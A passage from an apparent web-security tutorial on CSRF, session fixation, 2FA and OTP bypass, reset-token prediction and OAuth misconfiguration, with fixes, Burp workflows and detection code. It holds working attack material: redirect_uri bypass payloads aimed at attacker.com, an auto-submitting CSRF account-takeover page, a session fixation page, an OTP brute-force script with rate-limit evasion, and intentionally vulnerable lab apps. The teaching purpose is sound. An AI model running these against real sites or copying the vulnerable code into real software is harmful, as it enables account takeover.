print(f"Node (MAC): {token.node}")  # MAC address
```

**Exploitation:**

1. Request a password reset for attacker's account at time T.
2. Note the token's UUID v1 timestamp.
3. Request a password reset for the victim's account at time T+1.
4. Predict the victim's token by calculating the expected timestamp.

**Fix:** Use UUID v4 (random) or `crypto.randomBytes()`.

### 11.2 Sequential Token Generation

```javascript
// VULNERABLE -- sequential token
let tokenCounter = 1000;
function generateResetToken() {
  return (++tokenCounter).toString(36); // "rs", "rt", "ru", ...
}
```

An attacker requests their own reset, observes the token value, and can predict the next token.

### 11.3 Weak Randomness (Math.random)

```javascript
// VULNERABLE -- Math.random is not cryptographically secure
function generateResetToken() {
  return Math.random().toString(36).substring(2);
}
```

`Math.random()` uses a PRNG (V8 uses xorshift128+) that can be reverse-engineered from a few observed outputs to predict future values.

**Fix:**

```javascript
const crypto = require('crypto');
function generateResetToken() {
  return crypto.randomBytes(32).toString('hex');
}
```

---

## 12. OAuth Misconfiguration Exploitation

### 12.1 Open Redirect in redirect_uri

If the OAuth provider does not strictly validate the `redirect_uri`, the attacker can redirect the authorization code to their server:

```
https://accounts.google.com/o/oauth2/auth?
  client_id=target-app-client-id&
  redirect_uri=https://attacker.com/callback&
  response_type=code&
  scope=openid email profile&
  state=random-state
```

If the OAuth provider allows this redirect, the authorization code is sent to `attacker.com`, and the attacker can exchange it for an access token.

**Common bypass patterns for redirect_uri validation:**

```
# Subdirectory manipulation
https://target.com/callback/../attacker-page

# Parameter pollution
https://target.com/callback?redirect=https://attacker.com

# Subdomain
https://callback.attacker.com (if validation only checks the domain suffix)

# URL encoding
https://target.com/callback%40attacker.com

# Using @ to redirect
https://target.com/callback@attacker.com

# Fragment injection (the code is in the fragment, which is not sent to the server)
https://target.com/callback#@attacker.com

# Partial match bypass
https://attacker.com/.target.com/callback
https://target.com.attacker.com/callback
```

### 12.2 Missing State Parameter (CSRF in OAuth)

If the OAuth flow does not include a `state` parameter (or does not validate it), an attacker can initiate an OAuth flow, obtain the authorization URL, and trick the victim into completing it:

1. Attacker initiates OAuth login, gets the authorization URL with their authorization code.
2. Attacker sends the callback URL to the victim: `https://target.com/callback?code=attacker-auth-code`.
3. Victim's browser loads the URL. The application exchanges the code and links the attacker's OAuth account to the victim's session.
4. Attacker can now log in to the victim's account using their OAuth provider.

### 12.3 Token Leakage via Referer

If the OAuth callback page loads external resources, the access token in the URL fragment or the authorization code in the query string leaks via the `Referer` header.

### 12.4 Insecure Token Storage

```javascript
// VULNERABLE -- storing OAuth tokens in localStorage
localStorage.setItem('oauth_access_token', response.data.access_token);
localStorage.setItem('oauth_refresh_token', response.data.refresh_token);
// Any XSS can steal these
```

**Fix:** Store tokens server-side in an encrypted session store. The client should only have a session cookie.

### 12.5 Vulnerable OAuth Implementation (Express.js)

```javascript
// routes/oauth.js -- VULNERABLE
const axios = require('axios');

router.get('/auth/google/callback', async (req, res) => {
  const { code } = req.query;
  // No state parameter validation (CSRF vulnerability)
  
  const tokenResponse = await axios.post('https://oauth2.googleapis.com/token', {
    client_id: process.env.GOOGLE_CLIENT_ID,
    client_secret: process.env.GOOGLE_CLIENT_SECRET,
    code: code,
    grant_type: 'authorization_code',
    redirect_uri: req.query.redirect_uri, // VULNERABLE: taking redirect_uri from user input
  });
  
  const { access_token } = tokenResponse.data;
  
  const userInfo = await axios.get('https://www.googleapis.com/oauth2/v3/userinfo', {
    headers: { Authorization: `Bearer ${access_token}` }
  });
  
  // VULNERABLE: auto-linking OAuth to existing account by email
  // without verifying the email is verified on the OAuth provider's side
  let user = await db.findUserByEmail(userInfo.data.email);
  if (!user) {
    user = await db.createUser({
      email: userInfo.data.email,
      name: userInfo.data.name,
      oauth_provider: 'google',
    });
  }
  
  req.session.userId = user.id;
  res.redirect('/dashboard');
});
```

**Fixed OAuth implementation:**

```javascript
// routes/oauth.js -- FIXED
const axios = require('axios');
const crypto = require('crypto');

const GOOGLE_REDIRECT_URI = `https://${process.env.APP_HOST}/auth/google/callback`;

router.get('/auth/google', (req, res) => {
  const state = crypto.randomBytes(32).toString('hex');
  req.session.oauthState = state;
  
  const authUrl = new URL('https://accounts.google.com/o/oauth2/auth');
  authUrl.searchParams.set('client_id', process.env.GOOGLE_CLIENT_ID);
  authUrl.searchParams.set('redirect_uri', GOOGLE_REDIRECT_URI); // Hardcoded
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('scope', 'openid email profile');
  authUrl.searchParams.set('state', state);
  
  res.redirect(authUrl.toString());
});

router.get('/auth/google/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // Validate state parameter
  if (!state || !req.session.oauthState || 
      !crypto.timingSafeEqual(Buffer.from(state), Buffer.from(req.session.oauthState))) {
    return res.status(403).send('Invalid state parameter');
  }
  delete req.session.oauthState;
  
  const tokenResponse = await axios.post('https://oauth2.googleapis.com/token', {
    client_id: process.env.GOOGLE_CLIENT_ID,
    client_secret: process.env.GOOGLE_CLIENT_SECRET,
    code: code,
    grant_type: 'authorization_code',
    redirect_uri: GOOGLE_REDIRECT_URI, // Hardcoded, not from user input
  });
  
  const { access_token, id_token } = tokenResponse.data;
  
  // Use id_token to get verified email (not just userinfo endpoint)
  const decoded = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
  
  if (!decoded.email_verified) {
    return res.status(400).send('Email not verified on OAuth provider');
  }
  
  let user = await db.findUserByEmail(decoded.email);
  if (user) {
    // Check if this OAuth provider is already linked
    const oauthLink = await db.findOAuthLink(user.id, 'google', decoded.sub);
    if (!oauthLink) {
      // Do NOT auto-link. Require the user to link manually from settings.
      return res.status(400).send('Account exists. Please log in and link Google from settings.');
    }
  } else {
    user = await db.createUser({
      email: decoded.email,
      name: decoded.name,
      email_verified: true,
    });
    await db.createOAuthLink(user.id, 'google', decoded.sub);
  }
  
  // Regenerate session
  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Session error');
    req.session.userId = user.id;
    req.session.fullyAuthenticated = true;
    req.session.save(() => res.redirect('/dashboard'));
  });
});
```

---

## 13. Burp Suite Workflow for CSRF and Authentication Testing

### 13.1 CSRF Testing Workflow

**Step 1: Identify State-Changing Endpoints**

1. Browse the entire application through Burp's proxy.
2. In **HTTP History**, filter for `POST`, `PUT`, `PATCH`, `DELETE` methods.
3. List every state-changing endpoint: email change, password change, settings update, profile edit, fund transfer, admin actions.

**Step 2: Analyze CSRF Protections**

For each endpoint:

1. Send the request to **Repeater**.
2. Note the CSRF protection mechanism: token in body, token in header, `Referer` check, `Origin` check, `SameSite` cookie.
3. Test each bypass:
   - Remove the CSRF token entirely.
   - Set the token to an empty string.
   - Use a token from a different session.
   - Change the HTTP method (POST to GET, POST to PUT).
   - Remove the `Referer` header (add `<meta name="referrer" content="no-referrer">` in the exploit page).
   - Check if the `Origin` header is validated (change to `null` or `https://attacker.com`).

**Step 3: Generate CSRF PoC**

1. Right-click the request in **HTTP History**.
2. Select **Engagement tools > Generate CSRF PoC**.
3. Burp generates an HTML form that, when opened by a victim, will submit the request.
4. Modify the PoC to auto-submit: add `<script>document.forms[0].submit()</script>`.
5. Test the PoC in an incognito window while logged into the target application.

**Step 4: Test JSON CSRF**

1. If the endpoint accepts JSON, Burp's CSRF PoC generator may not work directly.
2. Create a custom PoC using the `text/plain` form technique described in Section 3.
3. Or use `fetch()` with `no-cors` mode.

### 13.2 Authentication Testing Workflow

**Session Fixation:**

1. Open two browsers (or regular + incognito).
2. In Browser A (attacker), navigate to the login page. Copy the session cookie from the `Set-Cookie` header.
3. In Browser B (victim), manually set the same session cookie using the browser's DevTools console: `document.cookie = "connect.sid=ATTACKER_SESSION_ID; path=/"`.
4. In Browser B, log in with the victim's credentials.
5. In Browser A, navigate to an authenticated page.
6. If Browser A is now authenticated as the victim, session fixation is confirmed.

**Session Invalidation:**

1. Log in and copy the session cookie.
2. Log out.
3. In Burp Repeater, send a request to an authenticated endpoint with the old session cookie.
4. If authenticated data is returned, the session was not destroyed on logout.
5. Repeat after password change, password reset, and 2FA changes.

**2FA Bypass:**

1. Log in with valid credentials. The server should set some session state (e.g., `2fa_pending`).
2. Do not complete the 2FA step.
3. In Burp Repeater, send requests to various authenticated endpoints.
4. Check if any endpoint returns authenticated data despite 2FA not being completed.
5. Check the 2FA verification endpoint for the bypass techniques in Section 10 (empty code, null, missing parameter).

**Password Reset:**

1. Request a password reset. Check the email for the token.
2. Analyze the token: is it a UUID (v1 or v4)? Is it numeric? Is it short enough to brute-force?
3. Request two resets in quick succession. Compare the tokens for patterns.
4. Test if the token is invalidated after use (use it once, then try again).
5. Test if the token is invalidated when a new token is requested.
6. Test Host header injection (modify `Host` or add `X-Forwarded-Host`).

### 13.3 Burp Extensions for Authentication Testing

- **Autorize**: Automatically tests authorization by replaying requests with different user sessions. Essential for finding broken access control alongside auth issues.
- **Auth Analyzer**: Similar to Autorize, designed for testing authentication enforcement across all endpoints.
- **Turbo Intruder**: High-speed request sending for OTP brute force and race condition testing.
- **Logger++**: Advanced logging for tracking session tokens across requests and detecting unexpected changes.

---

## 14. Common Developer Mistakes

### 14.1 Trusting the Client-Side for 2FA Enforcement

```javascript
// VULNERABLE React code
function App() {
  const [user, setUser] = useState(null);
  const [needs2FA, setNeeds2FA] = useState(false);

  // Client-side routing decides whether to show 2FA or dashboard
  // An attacker can simply modify the state in DevTools
  if (needs2FA) return <TwoFactorForm />;
  if (user) return <Dashboard user={user} />;
  return <LoginForm />;
}
```

The server must enforce 2FA on every request, not just the frontend.

### 14.2 Rate Limiting by IP Only

```javascript
// VULNERABLE rate limiting
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  // Default keyGenerator uses req.ip
  // Attacker can rotate IPs or spoof X-Forwarded-For
});
```

**Fix:** Rate limit by the combination of IP AND account identifier:

```javascript
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  keyGenerator: (req) => `login:${req.body.email}:${req.ip}`,
  // Also implement a global per-account limit
});

const accountLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10,
  keyGenerator: (req) => `login-account:${req.body.email}`,
});
```

### 14.3 CSRF Protection Only on Form Endpoints

Developers often add CSRF tokens to traditional form submissions but forget API endpoints consumed by the SPA frontend. If the API endpoint accepts cookies for authentication, it needs CSRF protection too.

### 14.4 Not Binding CSRF Tokens to Sessions

```javascript
// VULNERABLE: global token pool
const validTokens = new Set();

function generateCsrfToken() {
  const token = crypto.randomBytes(32).toString('hex');
  validTokens.add(token);
  return token;
}

function validateCsrfToken(token) {
  return validTokens.has(token);
  // Any valid token works for any session
}
```

### 14.5 Logout That Only Clears the Client

```javascript
// VULNERABLE React logout
function logout() {
  localStorage.removeItem('token');
  window.location = '/login';
  // The token is still valid on the server!
}
```

**Fix:** Call a server-side logout endpoint that invalidates the session/token, then clear client-side storage.

---

## 15. Detection Strategies

### 15.1 Server-Side Monitoring

```javascript
// Express.js middleware for authentication anomaly detection
const geoip = require('geoip-lite');

app.use(async (req, res, next) => {
  if (req.session && req.session.userId) {
    const currentIp = req.ip;
    const currentGeo = geoip.lookup(currentIp);
    const currentCountry = currentGeo ? currentGeo.country : 'unknown';
    
    // Detect impossible travel
    if (req.session.lastCountry && req.session.lastCountry !== currentCountry) {
      const timeDiff = Date.now() - req.session.lastActivityTime;
      if (timeDiff < 3600000) { // Less than 1 hour
        console.warn(`[ANOMALY] Impossible travel detected for user ${req.session.userId}: ` +
          `${req.session.lastCountry} -> ${currentCountry} in ${timeDiff/1000}s`);
        // Flag session for review, optionally require re-authentication
      }
    }
    
    // Detect user-agent changes within session
    if (req.session.userAgent && req.session.userAgent !== req.headers['user-agent']) {
      console.warn(`[ANOMALY] User-agent changed mid-session for user ${req.session.userId}`);
    }
    
    req.session.lastCountry = currentCountry;
    req.session.lastActivityTime = Date.now();
    req.session.userAgent = req.headers['user-agent'];
  }
  next();
});
```

### 15.2 CSRF Attack Detection

Log all requests that fail CSRF validation. A spike in CSRF failures may indicate an active attack:

```javascript
function csrfProtection(req, res, next) {
  // ... validation logic ...
  
  if (!valid) {
    console.warn(`[CSRF-FAILURE] ${req.method} ${req.originalUrl} from ${req.ip}, ` +
      `Origin: ${req.headers.origin}, Referer: ${req.headers.referer}`);
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  
  next();
}
```

### 15.3 AWS CloudWatch Alarms

```bash
# AWS CLI: Create a CloudWatch alarm for excessive failed login attempts
aws cloudwatch put-metric-alarm \
  --alarm-name "HighFailedLogins" \
  --metric-name "FailedLoginAttempts" \
  --namespace "Application/Auth" \
  --statistic Sum \
  --period 300 \
  --threshold 100 \
  --comparison-operator GreaterThanThreshold \
  --evaluation-periods 1 \
  --alarm-actions "arn:aws:sns:us-east-1:123456789:security-alerts" \
  --dimensions Name=Environment,Value=production
```

### 15.4 Linux Audit Logging

```bash
# Monitor authentication-related file access
auditctl -w /var/log/auth.log -p rwa -k auth_log_access
auditctl -w /etc/shadow -p r -k shadow_read

# Monitor for mass curl/wget activity (potential brute force tools)
auditctl -a always,exit -F arch=b64 -S connect -F a0=2 -k outbound_connections
```

---

## 16. Prevention Strategies Summary

| Vulnerability | Prevention |
|--------------|-----------|
| CSRF | SameSite=Strict cookies, session-bound CSRF tokens, Origin/Referer validation |
| JSON CSRF | Strict Content-Type checking, do not accept `text/plain` for JSON endpoints |
| Session fixation | Regenerate session ID after authentication |
| Weak session invalidation | Destroy server-side session on logout, password change, password reset |
| OTP brute force | Per-account rate limiting, account lockout, long OTP codes, exponential backoff |
| 2FA bypass | Server-side enforcement on every request, not just the frontend |
| Password reset token prediction | Use `crypto.randomBytes(32)`, hash tokens before storage, expire after 15 min |
| Host header injection | Hardcode the application URL in password reset emails |
| OAuth misconfiguration | Strict redirect_uri validation, state parameter, verify email_verified claim |
| Email verification bypass | Re-verify on email change, atomic uniqueness constraints |

---

## 17. Bug Bounty Report Example

```
## Title
CSRF Token Bypass via Empty Token Leading to Account Email Change

## Severity
High (CVSS 8.1)

## Summary
The CSRF protection middleware on the email change endpoint
(/api/account/email) accepts requests where the csrf_token parameter
is present but empty. This allows an attacker to craft a CSRF attack
that changes the victim's email address, leading to full account takeover
via the password reset flow.

## Steps to Reproduce

1. Log in to the application as the victim (any regular user account).
2. Host the following HTML on an attacker-controlled server:

   ```html
   <html>
   <body>
   <form id="csrf" action="https://target.com/api/account/email" method="POST">
     <input type="hidden" name="email" value="attacker@evil.com" />
     <input type="hidden" name="csrf_token" value="" />
   </form>
   <script>document.getElementById('csrf').submit();</script>
   </body>
   </html>
   ```

3. Send the URL to the victim (via email, chat, or social engineering).
4. When the victim visits the page, their email is changed to attacker@evil.com.
5. The attacker requests a password reset for attacker@evil.com.
6. The attacker receives the reset email, resets the password, and logs in
   as the victim.

## Impact

Full account takeover. The attacker can:
- Access all victim's data
- Perform actions as the victim
- Lock the victim out of their account
- Access connected third-party services (OAuth)

## Root Cause

The CSRF middleware checks:
```javascript
if (req.body.csrf_token && req.body.csrf_token !== req.session.csrfToken) {
  return res.status(403).send('Invalid token');
}
```

The condition `req.body.csrf_token && ...` evaluates to false when the token
is an empty string (falsy in JavaScript), so the validation is skipped entirely.

## Remediation

1. Change the CSRF validation to explicitly check for the presence AND
   non-empty value of the token:

   ```javascript
   if (!req.body.csrf_token || typeof req.body.csrf_token !== 'string' ||
       req.body.csrf_token.length === 0) {
     return res.status(403).send('CSRF token required');
   }
   ```

2. Use a well-tested CSRF library (csurf, csrf-csrf) instead of custom
   implementation.
3. Add SameSite=Strict to the session cookie as defense in depth.

## CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
```

---

## 18. Severity Explanation

| Vulnerability | Typical Severity | Reasoning |
|--------------|-----------------|-----------|
| CSRF on critical action (email change, password change) | High (P2) | Leads to account takeover with one-click social engineering |
| CSRF on non-critical action (theme change, notification settings) | Low (P4) | Minimal impact |
| Session fixation | High (P2) | Full account takeover if chained with social engineering |
| 2FA bypass | Critical (P1) | Defeats a primary security control |
| OTP brute force (no rate limiting) | High (P2) | Direct account access |
| Password reset token prediction | Critical (P1) | Account takeover without user interaction |
| Host header injection in reset email | Medium-High (P2-P3) | Requires victim to click a link |
| OAuth redirect_uri manipulation | High-Critical (P1-P2) | Authorization code theft, account linking |
| Weak session invalidation | Medium (P3) | Extends the window for other attacks |
| Email verification bypass | Medium (P3) | Can lead to account takeover in specific flows |

Severity increases when:
- The vulnerability leads to account takeover.
- No user interaction is required (or minimal interaction like clicking a link).
- The target application handles financial data, PII, or has a large user base.
- The vulnerability can be chained with other findings.

---

## 19. Realistic PoC Examples

### 19.1 Full CSRF to Account Takeover PoC

```html
<!-- attacker.html -- full exploitation chain -->
<html>
<head><title>Loading...</title></head>
<body>
<h1>Please wait while we process your request...</h1>

<!-- Step 1: Change victim's email via CSRF -->
<iframe name="csrf-frame" style="display:none"></iframe>
<form id="change-email" action="https://target.com/api/account/email" 
      method="POST" target="csrf-frame">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>

<script>
  // Submit the email change
  document.getElementById('change-email').submit();
  
  // Step 2: After 2 seconds, trigger password reset for the new email
  setTimeout(() => {
    fetch('https://target.com/api/auth/forgot-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    }).then(() => {
      document.body.innerHTML = '<h1>Done! You can close this page.</h1>';
    });
  }, 2000);
</script>
</body>
</html>
```

### 19.2 Session Fixation PoC

```html
<!-- attacker.html -- session fixation via cookie injection (requires same-site position) -->
<html>
<body>
<script>
  // Set a known session cookie on the target domain
  // This only works if the attacker controls a subdomain of the target
  document.cookie = "connect.sid=s%3Aattacker-known-session-id.signature; domain=.target.com; path=/";
  
  // Redirect victim to the login page
  window.location = "https://target.com/login";
</script>
</body>
</html>
```

### 19.3 OTP Brute Force Script

```python
#!/usr/bin/env python3
"""OTP brute force with rate limit evasion"""

import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "https://target.com/api/auth/verify-otp"
EMAIL = sys.argv[1] if len(sys.argv) > 1 else "victim@target.com"
SESSION_COOKIE = "session=abc123"

def try_otp(otp_value):
    otp = f"{otp_value:06d}"
    try:
        response = requests.post(TARGET, json={
            "email": EMAIL,
            "otp": otp
        }, headers={
            "Cookie": SESSION_COOKIE,
            "Content-Type": "application/json"
        }, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                return otp
        elif response.status_code == 429:
            time.sleep(5)
            return None
    except requests.exceptions.RequestException:
        return None
    return None

print(f"[*] Starting OTP brute force for {EMAIL}")
print(f"[*] Testing 000000 - 999999")

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(try_otp, i): i for i in range(1000000)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"\n[+] VALID OTP FOUND: {result}")
            executor.shutdown(wait=False, cancel_futures=True)
            sys.exit(0)

print("[-] No valid OTP found")
```

---

## 20. Lab Setup Ideas

### 20.1 Docker-Based Authentication Lab

```yaml
# docker-compose.yml
version: '3.8'
services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=development
      - DATABASE_URL=postgres://postgres:password@db:5432/auth_lab
      - REDIS_URL=redis://redis:6379
      - SESSION_SECRET=insecure-lab-secret
      - APP_HOST=localhost:3000
      - GOOGLE_CLIENT_ID=fake-client-id
      - GOOGLE_CLIENT_SECRET=fake-client-secret
    depends_on:
      - db
      - redis

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: auth_lab
      POSTGRES_PASSWORD: password
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
      - pgdata:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine

  mailhog:
    image: mailhog/mailhog
    ports:
      - "8025:8025"  # Web UI for viewing sent emails
      - "1025:1025"  # SMTP

volumes:
  pgdata:
```

**init.sql:**

```sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255),
  display_name VARCHAR(200),
  email_verified BOOLEAN DEFAULT false,
  two_factor_secret VARCHAR(100),
  two_factor_enabled BOOLEAN DEFAULT false,
  otp_hash VARCHAR(64),
  otp_expires_at TIMESTAMP,
  otp_locked_until TIMESTAMP,
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE password_resets (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  token_hash VARCHAR(64) NOT NULL,
  expires_at TIMESTAMP NOT NULL,
  used BOOLEAN DEFAULT false,
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE oauth_links (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  provider VARCHAR(50) NOT NULL,
  provider_user_id VARCHAR(255) NOT NULL,
  created_at TIMESTAMP DEFAULT NOW(),
  UNIQUE(provider, provider_user_id)
);

-- Insert test users
INSERT INTO users (email, password_hash, display_name, email_verified)
VALUES 
  ('admin@lab.com', '$2b$12$LJ3m4ys3Lk0TSwHjfZ3ZCOzMnYq8Bdsqcm5F5.nMvIzMGMkH5GiK', 'Admin', true),
  ('user@lab.com', '$2b$12$LJ3m4ys3Lk0TSwHjfZ3ZCOzMnYq8Bdsqcm5F5.nMvIzMGMkH5GiK', 'User', true);
-- Password for both: password123
```

### 20.2 FastAPI Authentication Lab

```python
# main.py -- intentionally vulnerable FastAPI app
import os
import uuid
import hashlib
import secrets
from datetime import datetime, timedelta
from fastapi import FastAPI, Request, Response, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import asyncpg

app = FastAPI(title="Auth Vulnerability Lab")

# VULNERABLE: overly permissive CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

sessions = {}  # In-memory session store (intentionally simple)

@app.post("/api/auth/login")
async def login(request: Request, response: Response):
    body = await request.json()
    # ... authenticate ...
    
    # VULNERABLE: no session regeneration
    session_id = request.cookies.get("session_id", str(uuid.uuid4()))
    sessions[session_id] = {"user_id": user.id, "authenticated": True}
    response.set_cookie("session_id", session_id)  # No HttpOnly, Secure, SameSite
    return {"success": True}

@app.post("/api/auth/forgot-password")
async def forgot_password(request: Request):
    body = await request.json()
    email = body["email"]
    
    # VULNERABLE: predictable token (UUID v1)
    token = str(uuid.uuid1())
    
    # VULNERABLE: using Host header
    host = request.headers.get("host")
    reset_url = f"http://{host}/reset?token={token}"
    
    # Send email with reset_url
    return {"message": "If account exists, email sent"}

@app.post("/api/auth/verify-otp")
async def verify_otp(request: Request):
    body = await request.json()
    # VULNERABLE: no rate limiting, no account lockout
    otp = body.get("otp", "")
    # ... check OTP ...
    return {"success": otp == stored_otp}

@app.post("/api/account/email")
async def change_email(request: Request):
    # VULNERABLE: no CSRF protection
    body = await request.json()
    session_id = request.cookies.get("session_id")
    session = sessions.get(session_id)
    if not session:
        raise HTTPException(401)
    
    # VULNERABLE: no re-authentication, no email re-verification
    await db.execute("UPDATE users SET email = $1 WHERE id = $2",
                     body["email"], session["user_id"])
    return {"success": True}

@app.post("/api/auth/logout")
async def logout(request: Request, response: Response):
    # VULNERABLE: only clears cookie, does not destroy session
    response.delete_cookie("session_id")
    return {"success": True}
```

### 20.3 Existing Labs

- **PortSwigger Web Security Academy**: Comprehensive, free labs for CSRF, authentication bypass, OAuth, and session management.
- **OWASP WebGoat**: Java-based vulnerable application with structured authentication lessons.
- **Juice Shop**: Docker-based, includes authentication bypass challenges.
- **HackTheBox and TryHackMe**: Offer machines and rooms specifically targeting authentication vulnerabilities.
- **PentesterLab**: Paid platform with excellent progressive exercises for OAuth, JWT, and session attacks.

---

## Conclusion

CSRF, session fixation, and authentication bypass are not legacy vulnerabilities. They persist in modern applications because authentication is fundamentally difficult to implement correctly. Every password reset flow, every OAuth integration, every session management decision introduces potential for error.

The most impactful findings in this space come from thorough, methodical testing:

1. Map every state-changing endpoint and test each CSRF bypass technique.
2. Verify session regeneration on login, session destruction on logout, and session invalidation on password change.
3. Test 2FA enforcement on every authenticated endpoint, not just the ones the frontend routes through.
4. Analyze password reset token entropy, expiration, and invalidation.
5. Probe OAuth implementations for redirect_uri manipulation, missing state parameters, and insecure account linking.
6. Test OTP endpoints for rate limiting using IP rotation, race conditions, and response manipulation.

For developers: use well-tested libraries (`csurf` or `csrf-csrf` for CSRF, `passport` for OAuth, `speakeasy` for TOTP), configure session cookies with `HttpOnly`, `Secure`, `SameSite=Strict`, regenerate session IDs on authentication state changes, and hardcode trusted URLs instead of deriving them from request headers.

---

**Apply these techniques in your next assessment.** Set up the lab environments described above, reproduce each vulnerability, and practice the Burp Suite workflows until they become second nature. The next article in this series will cover API security vulnerabilities, including broken object-level authorization, mass assignment, and GraphQL-specific attacks.
